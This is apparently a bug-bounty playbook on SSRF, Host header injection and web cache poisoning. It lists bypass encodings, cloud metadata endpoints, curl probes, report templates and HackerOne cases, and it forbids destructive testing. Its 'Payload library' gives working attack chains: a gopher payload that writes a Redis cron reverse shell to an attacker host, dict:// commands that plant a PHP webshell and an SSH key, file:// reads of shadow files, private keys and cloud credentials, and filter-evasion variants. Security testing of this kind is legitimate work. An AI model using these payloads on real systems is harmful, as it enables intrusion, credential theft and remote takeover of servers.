# SSRF / Host Header / Cache Poisoning

> Perspective: black-box; the goal is to make the target server access the intranet / cloud metadata for you / poison the cache

## 1. In one sentence

- **SSRF**: make the server send a request on your behalf to a place "it can reach, but you can't."
- **Host Header injection**: forge Host / X-Forwarded-* to make the application construct a wrong URL / cache key.
- **Cache poisoning**: persist a malicious response into the shared cache layer so subsequent users get hit.

SRC value: unauthenticated SSRF → cloud metadata → P0 ($3k–$20k); cache poisoning (admin backend) → P1.

---

## 2. High-frequency entry points

### 2.1 SSRF entries (must check)

```
?url=                ?fetch=
?image=              ?img=
?proxy=              ?source=
?path=               ?file= (if it supports http://)
?callback=           ?webhook=
?next=               ?redirect=
?continue=           ?return=

Feature scenarios:
- Avatar / remote image import
- URL preview (chat / comments)
- Webhook callback test
- RSS / Atom subscription
- Remote PDF / Excel / video import
- OAuth redirect / SAML ACS
- Server-side image processing (ImageMagick)
- PDF generation (wkhtmltopdf / Puppeteer)
- Email preview (Open Graph fetch)
```

### 2.2 Host / X-Forwarded-* entries

```
Host
X-Forwarded-Host
X-Forwarded-For
X-Forwarded-Proto
X-Forwarded-Port
X-Forwarded-Server
X-Real-IP
X-Original-URL
X-Rewrite-URL
True-Client-IP
X-Client-IP
Forwarded: for=...; host=...
```

---

## 3. Probing techniques

### 3.1 SSRF basic probe (first check whether it issues a request)

```bash
# 1. Use your own OOB server (webhook.site / Burp Collaborator / interactsh)
url=https://your-oob-domain.com/abc

# Check whether the OOB platform receives the request
# Received → at least basic SSRF exists
```

### 3.2 Intranet probing

```
# Loopback / intranet
url=http://127.0.0.1
url=http://127.0.0.1:80
url=http://127.0.0.1:8080
url=http://127.0.0.1:6379       # Redis
url=http://127.0.0.1:9200       # ES
url=http://127.0.0.1:8500       # Consul

url=http://localhost
url=http://10.0.0.1
url=http://172.16.0.1
url=http://192.168.0.1
url=http://[::1]
url=http://[::ffff:127.0.0.1]
```

### 3.3 IP-representation bypass

```
# Equivalent ways to write 127.0.0.1
http://127.0.0.1
http://2130706433              # decimal
http://017700000001            # octal
http://0x7f000001              # hexadecimal
http://0x7f.0x0.0x0.0x1
http://0177.0.0.1
http://127.1                   # shorthand
http://127.0.1
http://[::1]
http://[::ffff:7f00:1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

### 3.4 Domain bypass

```
http://localtest.me            # → 127.0.0.1 (public DNS)
http://127.0.0.1.nip.io        # → 127.0.0.1
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://attacker.com#@127.0.0.1
http://attacker.com\@127.0.0.1
http://attacker.com&@127.0.0.1
http://attacker.com:8080@127.0.0.1
http://[email protected]@127.0.0.1
```

### 3.5 Protocol bypass

```
file:///etc/passwd
file://localhost/etc/passwd

dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats

gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...
gopher://127.0.0.1:25/ ... SMTP

ldap://127.0.0.1:389/
sftp://127.0.0.1:22/
tftp://attacker.com/file
ftp://anonymous:test@target/
```

### 3.6 Cloud metadata (must try, highest value)

```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://instance-data/latest/meta-data/

# AWS IMDSv2 (when v1 is disabled)
1. PUT http://169.254.169.254/latest/api/token  Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
2. GET ... Header: X-aws-ec2-metadata-token: <token>
   → most SSRF cannot PUT; IMDSv2 is an effective mitigation

# GCP (must include Header: Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (must include Header: Metadata: true)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/

# Tencent Cloud
http://metadata.tencentyun.com/latest/meta-data/

# Huawei Cloud
http://169.254.169.254/openstack/latest/meta_data.json

# Kubernetes
http://kubernetes.default.svc/api/v1/namespaces/default/pods
```

### 3.7 Redirect bypass

Some applications "first validate the URL domain against a safelist, then send the request," but follow a 302 redirect to the intranet:

```python
# On attacker.com
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/

# Make the target think it requests attacker.com, but it actually follows to the intranet
url=https://attacker.com/redirect
```

### 3.8 DNS Rebinding

```
# Use rbndr.us
url=http://7f000001.c0a80101.rbndr.us
# The 1st resolution returns 127.0.0.1, the 2nd returns 192.168.1.1
# The application resolves first → validates → the second resolution becomes the intranet

# Self-hosted rebinder: tartarsauce.org / dnsrebind.lock.cmpxchg8b.com
```

### 3.9 Host Header injection probe

```bash
# 1. Simple Host replacement
curl -H "Host: attacker.com" https://target/login -i
# Check whether the response contains attacker.com (password-reset link / redirect)

# 2. X-Forwarded-Host
curl -H "Host: target.com" -H "X-Forwarded-Host: attacker.com" https://target/login -i

# 3. Double Host header
curl -H "Host: target.com" -H "Host: attacker.com" https://target/login -i

# 4. Host + port
curl -H "Host: target.com:8080@attacker.com" https://target/login -i
```

**Watch for**:
- attacker.com appearing in the password-reset / email link → the attacker's Host controlled the reset link
- Redirect to attacker.com → open redirect
- The cache (Cache-Control: public) caches the poisoned response

### 3.10 Cache-poisoning probe

```bash
# 1. Inject via X-Forwarded-Host
curl -H "X-Forwarded-Host: attacker.com" https://target/?cb=1 -i
# Check whether the response contains attacker.com (in link, canonical, og:url, etc.)

# 2. Hit the cache
# Request the same path multiple times
for i in {1..3}; do curl -I "https://target/?cb=1"; done
# Check X-Cache: HIT / Age: > 0

# 3. Path normalization (Web Cache Deception)
curl -I "https://target/profile.php/.css"
curl -I "https://target/account/.js"
# If it returns authenticated content and it is cached, the next anonymous user can read it

# 4. Double slash
curl -I "https://target//admin"
curl -I "https://target/admin;%2f"
```

---

## 4. Bypass matrix (SSRF, see methodology/02 Chapter 6 for details)

| Blocked by | Bypass |
|---|---|
| `127.0.0.1` string blocking | decimal / octal / hex IP |
| `localhost` blocking | `127.1` / `127.0.0.0.1` / `0.0.0.0` |
| `internal`/`private` keyword | DNS Rebinding |
| Only `https://` allowed | URL encoding / double protocol / redirect |
| Domain allowlist | `attacker.com#@target.com`, `@` username-segment bypass |
| Only a certain domain allowed | subdomain: `legit-attacker.com.evil.com` resolution |
| Port blacklist | use intranet services on common ports like 22/80/443 (gopher://) |
| AWS IMDSv2 | try v1: `http://169.254.169.254/latest/meta-data/`; some old instances have not enabled v2 |

---

## 5. Exploitation for escalation / lateral

```
Basic SSRF
  → outbound callback proof (DNSLog)
  → intranet port scanning (http://10.0.0.0/8 various ports)
  → intranet Redis writing an SSH key (gopher://)
  → cloud metadata → IAM temporary credentials (AWS STS / GCP token)
  → IAM credentials → full cloud control
  → S3 / OSS bucket read/write
  → lateral to the Kubernetes API
```

Reference real value: on the H1 platform, AWS metadata SSRF reports commonly earn $5k–$50k.

### Host Header exploitation chain

```
Host injection → the password-reset URL contains attacker.com
  → the user clicks the reset email → the reset_token is sent to attacker.com
  → the attacker uses the token to reset the victim's password

Host injection → og:url is poisoned in the cache
  → the victim sees a share card pointing to attacker.com → phishing

Web Cache Deception
  → /account/.css caches alice's account page
  → bob visits /account/.css → sees alice's data
```

---

## 6. Real-case fingerprints

| Vulnerability | Fingerprint |
|------|------|
| Capital One AWS | SSRF → `http://169.254.169.254/latest/meta-data/iam/security-credentials/...` obtained IAM credentials → full S3 data |
| Shopify GCP | SSRF → `metadata.google.internal/computeMetadata/v1/` |
| HackerOne SSRF | `?url=` accepts `http://localhost`, hits the intranet Mongo |
| Confluence CVE-2019-3396 | template injection + SSRF |
| Jira CVE-2019-8451 | `/plugins/servlet/gadgets/makeRequest?url=...` |
| WeasyPrint / wkhtmltopdf | the PDF generator parsing `<img src=>` in HTML triggers SSRF |
| Microsoft Outlook | email preview / rich-text fetch SSRF |

Common fingerprints:
- `?url=https://oob.attacker.cc/x` → the OOB platform receives it → basic SSRF
- The received User-Agent contains `wkhtmltopdf` / `Headless Chrome` / `Java/1.x` → renderer/HTTP client
- Trying `file:///etc/passwd` returns 200 → missing protocol allowlist
- Trying `http://169.254.169.254/...` returns token JSON → cloud metadata reachable

---

## 7. Reproduction / evidence essentials

### 7.1 Report must-haves

1. Full request packet (with the fuzzed url parameter)
2. Response or exfiltration evidence (OOB platform log screenshot, with timestamp, source IP)
3. Impact-escalation proof (do not actually exploit, but show what content can be obtained)

### 7.2 PoC template (cloud metadata)

```http
POST /api/preview HTTP/1.1
Host: target.com
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

→ response (redacted):
HTTP/1.1 200 OK
Content-Type: text/plain

xxx-app-role-prod
(this proves the IAM role name can be obtained; no further attempt to obtain temporary credentials)
```

### 7.3 Host-injection PoC

```http
POST /api/forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/json

{"email":"hunter@example.com"}

→ email link:
https://attacker.com/reset?token=eyJhb...
```

### 7.4 CVSS

```
Unauthenticated SSRF → metadata → cloud control    = 9.8 Critical
Unauthenticated SSRF → intranet port scanning       CVSS = 7.5
Authenticated SSRF → intranet                       = 6.5
Host injection → password-reset poisoning           = 8.1
Cache poisoning → authenticated-state leak          = 7.5
```

### 7.5 Impact section

```
Via the url parameter of the /api/preview endpoint, an attacker can make the server send requests to any address on its behalf.
Confirmed reachable:
1. Intranet 127.0.0.1 / 10.x.x.x segment services (port scanning is feasible)
2. AWS metadata endpoint (obtained the IAM role name xxx-app-role-prod)
3. Intranet Redis / Mongo ports (only reachability probing, no business commands issued)

I did not attempt to obtain IAM temporary credentials / did not read any secret; I only proved cloud metadata is reachable.
```

---

## Related MCP tools

In practice, jshookmcp can be invoked for automation. **The default `search` profile does not pre-load tools; before invoking, first activate with `mcp__jshook__activate_tools <tool_name>`** (see [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §recommended profile).

| Tool | Domain | When to invoke |
|---|---|---|
| `mcp__jshook__network_intercept` + `mcp__jshook__network_get_requests` | network | intercept outbound requests / observe whether the SSRF actually fires |
| `mcp__jshook__http2_probe` + `mcp__jshook__http_request_build` | network | HTTP/2 frame construction to probe the intranet / bypass filtering |
| `mcp__jshook__network_replay_request` | network | replay and modify host / scheme / port to verify different protocols |
| `mcp__jshook__proto_infer_state_machine` | protocol-analysis | infer the state machine of a custom-protocol SSRF |

Full mapping: [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)

## 8. Things not to do

- **Forbidden**: actually calling the AWS API after obtaining IAM temporary credentials (`aws s3 ls` also counts). Only prove the metadata endpoint is reachable.
- **Forbidden**: using SSRF to trigger any "can-modify / can-delete" intranet service (Redis FLUSHALL, writing an SSH key, CONFIG SET).
- **Forbidden**: using SSRF + gopher to scan the entire intranet /8 segment. Verify the concept with 1–3 target IPs and stop.
- **Forbidden**: actually poisoning the shared cache (letting other users see the attack page). Prove you can poison on your own cache key.
- **Forbidden**: Host injection actually triggering a user password-reset email (sending to your own email is OK).
- **Restriction**: use your own OOB domain for SSRF probing; do not abuse someone else's DNSLog platform.

## H1 real cases

_A total of 108 disclosed HackerOne High/Critical reports hit this category, sorted by (bounty + votes×100), taking the Top 12_

| Severity | $ | Program | Title (click for the original report) | Summary |
|---|--:|---|---|---|
| Critical | — | HackerOne | [Server Side Request Forgery (SSRF) via Analytics Reports](https://hackerone.com/reports/2262382) | Hello Gents, I would like to report an issue where attackers are able to read internal files via an SSRF vulnerability |
| High | 10000 usd | GitLab | [SSRF on project import via the remote_attachment_url on a Note](https://hackerone.com/reports/826361) | Summary The Note model has an `attachment` which is provided by a CarrierWave uploader: One of the features this provides is th… |
| High | 6000 usd | Reddit | [Blind SSRF to internal services in matrix preview_link API](https://hackerone.com/reports/1960765) | Summary: Reddit' new chat is based on Matrix software which has preview_link functionality which doesn't filter the URL before … |
| Critical | 3500 usd | Slack | [TURN server allows TCP and UDP proxying to internal network, localhost and meta-data services](https://hackerone.com/reports/333419) | The TURN servers used by Slack allow TCP connections and UDP packets to be proxied to the internal network |
| High | — | GitLab | [Server Side Request Forgery mitigation bypass](https://hackerone.com/reports/632101) | Summary This vulnerability allows attacker to send arbitrary requests to local network which hosts GitLab and read the response |
| High | 4000 usd | GitLab | [Unauthenticated blind SSRF in OAuth Jira authorization controller](https://hackerone.com/reports/398799) | The `Oauth::Jira::AuthorizationsController#access_token` endpoint is vulnerable to a blind SSRF vulnerability |
| Critical | — | Vimeo | [SSRF  leaking internal google cloud data through upload function [SSH Keys, etc..]](https://hackerone.com/reports/549882) | SSRF leaking internal google cloud data through upload function [SSH Keys, etc..] |
| Critical | — | Evernote | [Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion](https://hackerone.com/reports/1189367) | Full read SSRF in www.evernote.com that can leak aws metadata and local file inclusion |
| Critical | — | GitLab | [Full Read SSRF on Gitlab's Internal Grafana](https://hackerone.com/reports/878779) | Apparently, Grafana is bundled with Gitlab by default. So the grafana instance that is accessible via `/-/grafana/`is vulnerabl… |
| High | — | Omise | [SSRF in webhooks leads to AWS private keys disclosure](https://hackerone.com/reports/508459) | Vulnerability Summary Omise makes use of Amazon AWS as their application environment |
| Critical | 3000 usd | Lark Technologies | [Stored XSS & SSRF in Lark Docs](https://hackerone.com/reports/892049) | Stored XSS & SSRF in Lark Docs |
| High | 2727 usd | TikTok | [External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing](https://hackerone.com/reports/1062888) | External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing |

**Weakness distribution for hits in this category:**

- Server-Side Request Forgery (SSRF): 93 entries
- Uncategorized → manually classified: 13 entries
- Externally Controlled Reference to a Resource in Another Sphere: 2 entries

## Payload library

_19 structured web payloads, including full attack chains + WAF/EDR bypass variants_

**Category distribution:** SSRF (12) · Cloud security vulnerabilities (4) · Cache and CDN security (3)

### · SSRF

### Basic SSRF attack  `ssrf-basic`
Server-side request forgery basic attack techniques
Sub-category: **basic attack** · tags: `ssrf` `server-side` `request`

**Prerequisites:** a URL input point exists; the server requests the user-supplied URL

**Attack chain:**

**1. 1. Probe SSRF**
_Probe for the SSRF vulnerability_
```
Input URL: http://127.0.0.1
Input URL: http://localhost
Input URL: http://[::1]
Observe whether the server response contains intranet information
```

**2. 2. Scan intranet ports**
_Scan intranet ports_
```
http://192.168.1.1:22
http://192.168.1.1:80
http://192.168.1.1:443
http://192.168.1.1:3306
Judge the port open state based on response differences
```

**3. 3. Access intranet services**
_Access intranet services_
```
http://192.168.1.100/admin
http://10.0.0.1:8080/manager
http://172.16.0.1:9200/_cat/indices
Access intranet management interfaces or sensitive services
```

**4. 4. Read local files**
_Read local files_
```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
Use the file protocol to read local files
```

**WAF/EDR bypass variants:**

**1. IP-format bypass**
_Use different IP formats to bypass_
```
http://0177.0.0.1 (octal)
http://2130706433 (decimal)
http://0x7f000001 (hexadecimal)
http://127.1 (shorthand)
http://127.0.0.1.nip.io (DNS rebinding)
```

**2. URL-parsing differences**
_Exploit URL-parsing differences_
```
http://attacker.com#@127.0.0.1/
http://127.0.0.1.attacker.com
http://attacker.com\@127.0.0.1/
Exploit URL-parsing differences to bypass
```

**3. DNS rebinding**
_DNS rebinding attack_
```
Use a DNS rebinding service:
http://7f000001.cip.cc (resolves to 127.0.0.1)
http://127.0.0.1.nip.io
The 1st resolution is a public IP, the 2nd resolution is an intranet IP
```

---

### AWS metadata attack  `ssrf-cloud-aws`
Use SSRF to access the AWS EC2 metadata service
Sub-category: **cloud metadata** · tags: `ssrf` `aws` `metadata` `cloud`

**Prerequisites:** an SSRF vulnerability exists; the target runs on AWS EC2

**Attack chain:**

**1. 1. Access the metadata service**
_Access the AWS metadata service_
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/
```

**2. 2. Obtain IAM credentials**
_Obtain IAM temporary credentials_
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
After obtaining the role name:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

**3. 3. Obtain user data**
_Obtain instance user data_
```
http://169.254.169.254/latest/user-data/
May contain sensitive information, API keys, startup scripts
```

**4. 4. Bypass with IMDSv2**
_Bypass IMDSv2 protection_
```
If IMDSv2 is enforced:
1. First obtain a token:
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
2. Access using the token:
Header: X-aws-ec2-metadata-token: TOKEN
```

**WAF/EDR bypass variants:**

**1. IP-encoding-variant bypass**
_Bypass the 169.254.169.254 blacklist detection via decimal, hexadecimal, octal, and IPv6-mapped IP-address encodings_
```
# Decimal integer:
http://2852039166/latest/meta-data/
# Hexadecimal:
http://0xA9FEA9FE/latest/meta-data/
# Octal:
http://0251.0376.0251.0376/latest/meta-data/
# IPv6-mapped:
http://[::ffff:169.254.169.254]/latest/meta-data/
# Mixed encoding:
http://0xA9.0376.169.0xFE/latest/meta-data/
```

**2. DNS rebinding and redirect-chain bypass**
_Use DNS rebinding so the domain resolves to a safe IP during validation but to the metadata address during the actual request, or bypass via an HTTP redirect chain and non-standard protocols_
```
# DNS rebinding (using a rebind service):
http://7f000001.A9FEA9FE.rbndr.us/latest/meta-data/
# The 1st resolution goes to the allowed IP, the 2nd to 169.254.169.254

# Redirect chain:
# On attacker.com, set a 302 redirect to http://169.254.169.254
http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/

# URL schema variant:
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.254.169.254%0A%0A
```

---

### GCP metadata attack  `ssrf-cloud-gcp`
Use SSRF to attack the Google Cloud metadata service
Sub-category: **GCP metadata** · tags: `ssrf` `gcp` `cloud` `metadata`

**Prerequisites:** an SSRF vulnerability exists; the target runs in a GCP environment

**Attack chain:**

**1. 1. Access the metadata service**
_Access the GCP metadata endpoint_
```
http://metadata.google.internal/computeMetadata/v1/
Requires adding the Header:
Metadata-Flavor: Google
```

**2. 2. Obtain an access token**
_Obtain a service-account token_
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Returns an OAuth access token
```

**3. 3. Obtain service-account info**
_Obtain the service-account email and aliases_
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases
```

**4. 4. Obtain project info**
_Obtain the project ID_
```
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
```

**5. 5. Obtain SSH keys**
_Obtain the SSH public key_
```
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
```

**6. 6. Obtain Kubelet credentials**
_Obtain GKE cluster info_
```
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
Obtain Kubernetes environment variables
```

**WAF/EDR bypass variants:**

**1. Use an IP address**
_Bypass domain filtering_
```
http://169.254.169.254/computeMetadata/v1/
Use the intranet IP instead of the domain
```

---

### Azure metadata attack  `ssrf-cloud-azure`
Use SSRF to attack the Azure metadata service
Sub-category: **Azure metadata** · tags: `ssrf` `azure` `cloud` `metadata`

**Prerequisites:** an SSRF vulnerability exists; the target runs in an Azure environment

**Attack chain:**

**1. 1. Access the metadata service**
_Access the Azure metadata endpoint_
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Requires adding the Header:
Metadata: true
```

**2. 2. Obtain an access token**
_Obtain a managed-identity token_
```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Returns an Azure AD access token
```

**3. 3. Obtain compute info**
_Obtain compute-instance info_
```
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
Returns VM details
```

**4. 4. Obtain network info**
_Obtain the network configuration_
```
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
Returns network configuration info
```

**5. 5. Obtain user data**
_Obtain user data_
```
http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text
Returns user-custom data
```

**WAF/EDR bypass variants:**

**1. Bypass the Metadata-header check**
_Bypass request-header validation_
```
Use HTTP request smuggling or a redirect to bypass the Metadata-header check
```

---

### SSRF protocol exploitation  `ssrf-protocol`
Use various protocols for SSRF attacks
Sub-category: **protocol exploitation** · tags: `ssrf` `protocol` `file` `gopher`

**Prerequisites:** an SSRF vulnerability exists; the server supports multiple protocols

**Attack chain:**

**1. 1. File protocol**
_Use the File protocol to read files_
```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
Read local files
```

**2. 2. Dict protocol**
_Use the Dict protocol to probe services_
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats
Probe intranet services
```

**3. 3. Gopher protocol**
_Use the Gopher protocol to attack intranet services_
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...
Construct Redis commands
```

**4. 4. LDAP protocol**
_Use the LDAP protocol_
```
ldap://attacker.com/cn=test
ldap://127.0.0.1:389/cn=test
Trigger an LDAP query
```

**5. 5. TFTP protocol**
_Use the TFTP protocol_
```
tftp://attacker.com/file
Trigger a TFTP request
```

**WAF/EDR bypass variants:**

**1. Protocol-casing bypass**
_Mixed-case bypass_
```
FILE:///etc/passwd
File:///etc/passwd
Gopher://127.0.0.1:6379/
```

---

### Gopher protocol attack  `ssrf-gopher`
Use the Gopher protocol to attack intranet services
Sub-category: **Gopher attack** · tags: `ssrf` `gopher` `redis` `mysql`

**Prerequisites:** an SSRF vulnerability exists; the server supports the Gopher protocol

**Attack chain:**

**1. 1. Gopher basic format**
_Gopher protocol format_
```
gopher://<host>:<port>/_<payload>
After _ is the actual data sent
Requires URL encoding
```

**2. 2. Attack Redis**
_Write a cron job to get a reverse shell_
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$28%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**3. 3. Attack MySQL**
_Attack a MySQL database_
```
gopher://127.0.0.1:3306/_<MySQL protocol data packet>
Requires constructing data in MySQL protocol format
```

**4. 4. Attack FastCGI**
_Attack PHP-FPM_
```
gopher://127.0.0.1:9000/_<FastCGI data packet>
Construct a PHP-FPM attack payload
```

**5. 5. Send an HTTP request**
_Send an HTTP request_
```
gopher://target.com:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d%0a
Construct an HTTP request to attack the intranet
```

**WAF/EDR bypass variants:**

**1. Double URL encoding**
_Double URL encoding bypass_
```
gopher://127.0.0.1:6379/_%252a%250d%250a...
Double encoding bypass
```

---

### Dict protocol attack  `ssrf-dict`
Use the Dict protocol to probe and attack intranet services
Sub-category: **Dict protocol** · tags: `ssrf` `dict` `redis` `memcached`

**Prerequisites:** an SSRF vulnerability exists; the server supports the Dict protocol

**Attack chain:**

**1. 1. Dict protocol format**
_Dict protocol basic format_
```
dict://<host>:<port>/<command>
Send a command to the target service
```

**2. 2. Probe Redis**
_Probe the Redis service_
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/keys%20*
Obtain Redis information
```

**3. 3. Probe Memcached**
_Probe the Memcached service_
```
dict://127.0.0.1:11211/stats
dict://127.0.0.1:11211/get%20key
Obtain Memcached information
```

**4. 4. Redis write to file**
_Write a WebShell_
```
dict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"
dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html
dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php
dict://127.0.0.1:6379/save
```

**WAF/EDR bypass variants:**

**1. Encoding bypass**
_URL encoding to bypass keyword filtering_
```
dict://127.0.0.1:6379/%73%65%74%20...
URL-encode the command
```

---

### File protocol attack  `ssrf-file`
Use the File protocol to read local files
Sub-category: **File protocol** · tags: `ssrf` `file` `lfi` `read`

**Prerequisites:** an SSRF vulnerability exists; the server supports the File protocol

**Attack chain:**

**1. 1. Linux sensitive files**  _[linux]_
_Read Linux sensitive files_
```
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/resolv.conf
file:///proc/self/environ
file:///proc/self/cmdline
```

**2. 2. Windows sensitive files**  _[windows]_
_Read Windows sensitive files_
```
file:///c:/windows/win.ini
file:///c:/windows/system32/config/sam
file:///c:/users/administrator/.ssh/id_rsa
file:///c:/inetpub/logs/logfiles/
```

**3. 3. Web config files**
_Read web application config_
```
file:///var/www/html/config.php
file:///var/www/html/wp-config.php
file:///app/config/database.yml
file:///app/.env
```

**4. 4. Cloud-environment files**
_Read cloud-environment credentials_
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///home/user/.aws/credentials
```

**5. 5. SSH keys**
_Read SSH private keys_
```
file:///home/user/.ssh/id_rsa
file:///home/user/.ssh/authorized_keys
file:///root/.ssh/id_rsa
```

**WAF/EDR bypass variants:**

**1. Mixed case**
_Mixed-case bypass_
```
FILE:///etc/passwd
File:///etc/passwd
file:///ETC/PASSWD
```

---

### SSRF bypass techniques  `ssrf-bypass`
Various techniques to bypass SSRF filtering
Sub-category: **bypass techniques** · tags: `ssrf` `bypass` `waf` `filter`

**Prerequisites:** an SSRF vulnerability exists; a filtering mechanism exists

**Attack chain:**

**1. 1. IP-format bypass**
_Use different IP formats to represent 127.0.0.1_
```
http://0177.0.0.1 (octal)
http://2130706433 (decimal)
http://0x7f000001 (hexadecimal)
http://127.1 (shorthand)
http://127.0.0.1.nip.io (DNS rebinding)
http://127.0.0.1.xip.io
```

**2. 2. URL-parsing differences**
_Exploit URL-parsing differences_
```
http://attacker.com#@127.0.0.1/
http://127.0.0.1.attacker.com
http://attacker.com\@127.0.0.1/
http://attacker.com\.127.0.0.1/
```

**3. 3. Redirect bypass**
_Exploit an HTTP redirect_
```
http://attacker.com/redirect?url=http://127.0.0.1
Use a URL-shortener service to redirect to the intranet
```

**4. 4. DNS rebinding**
_DNS rebinding attack_
```
http://7f000001.cip.cc
http://127.0.0.1.nip.io
The 1st resolution is a public IP, the 2nd resolution is an intranet IP
```

**5. 5. IPv6 bypass**
_Use an IPv6 address to bypass_
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[0000::1]
Use the IPv6 loopback address
```

**6. 6. Encoding bypass**
_Use encoding to bypass_
```
http://%31%32%37%2e%30%2e%30%2e%31 (URL encoding)
http://127.0.0.1%00attacker.com (null byte)
http://127.0.0.1%0d%0aHost:attacker.com (CRLF)
```

**WAF/EDR bypass variants:**

**1. Combined bypass**
_Combine multiple bypass techniques_
```
http://0x7f.0.0.1
http://0177.0.0.1
http://127.000.000.001
Combine multiple formats
```

---

### DNS rebinding attack  `ssrf-dns-rebinding`
Use DNS rebinding to bypass SSRF protection
Sub-category: **DNS rebinding** · tags: `ssrf` `dns` `rebinding` `bypass`

**Prerequisites:** an SSRF vulnerability exists; DNS-resolution validation exists

**Attack chain:**

**1. 1. DNS-rebinding principle**
_DNS-rebinding principle_
```
1st DNS query: returns a public IP (passes validation)
2nd DNS query: returns an intranet IP (actual access)
Exploit TTL=0 or a short TTL
```

**2. 2. Use a public service**
_Use a DNS-rebinding service_
```
http://7f000001.cip.cc (resolves to 127.0.0.1)
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network
```

**3. 3. Self-hosted DNS server**
_Self-host a DNS-rebinding server_
```
# Build with dnspython
from dnslib import *
class RebindResolver:
    def __init__(self):
        self.count = 0
    def resolve(self, request):
        self.count += 1
        if self.count % 2 == 1:
            return "1.2.3.4"  # public IP
        else:
            return "127.0.0.1"  # intranet IP
```

**4. 4. Attack flow**
_Complete attack flow_
```
1. Register a domain pointing to the self-hosted DNS server
2. Configure the DNS server to return two IPs
3. Use that domain to initiate the SSRF request
4. The 1st validation passes, the 2nd access hits the intranet
```

**WAF/EDR bypass variants:**

**1. Multi-IP response**
_Exploit a multi-IP response_
```
The DNS response contains multiple A records
The server may pick a different IP
```

---

### SSRF attacking Redis  `ssrf-redis`
Use SSRF to attack an intranet Redis service
Sub-category: **Redis attack** · tags: `ssrf` `redis` `rce` `webshell`

**Prerequisites:** an SSRF vulnerability exists; an unauthorized Redis exists on the intranet

**Attack chain:**

**1. 1. Probe Redis**
_Probe the Redis service_
```
dict://127.0.0.1:6379/info
Or use Gopher:
gopher://127.0.0.1:6379/_INFO
```

**2. 2. Write a WebShell**
_Write a WebShell to the web directory_
```
# Use the Dict protocol
dict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"
dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html
dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php
dict://127.0.0.1:6379/save
```

**3. 3. Write an SSH public key**
_Write an SSH public key_
```
dict://127.0.0.1:6379/set%20ssh%20"ssh-rsa AAAA..."
dict://127.0.0.1:6379/config%20set%20dir%20/root/.ssh
dict://127.0.0.1:6379/config%20set%20dbfilename%20authorized_keys
dict://127.0.0.1:6379/save
```

